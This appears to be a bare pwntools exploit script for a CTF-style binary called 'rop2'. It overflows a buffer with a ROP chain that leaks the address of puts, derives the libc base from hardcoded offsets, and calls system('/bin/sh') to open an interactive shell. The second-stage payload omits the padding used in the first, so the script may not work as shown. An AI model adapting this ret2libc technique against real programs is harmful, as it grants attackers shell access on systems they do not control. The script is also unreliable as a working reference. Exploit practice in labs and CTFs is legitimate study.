from pwn import *

p = process("./rop2")

bin = 0x402004
ret = 0x40101a
pop_rdi = 0x401283
put_plt = 0x401060
put_got = 0x404018
main_plt = 0x4011cf


payload = b"A"*0x408
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(put_got)
payload += p64(put_plt)
payload += p64(main_plt)

p.recvuntil(b"buf:")
p.sendline(payload)

put_address = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
log.info('addres : '+ hex(put_address))

libc = put_address - 0x84450
system = libc + 0x522c0
bin_sh = libc + 0x1b45be

log.info('addres : '+ hex(libc))
log.info('addres : '+ hex(system))

pay = p64(ret)

pay += p64(pop_rdi)
pay += p64(bin_sh)
pay += p64(system)

p.sendlineafter(b"buf:",pay)

p.interactive()
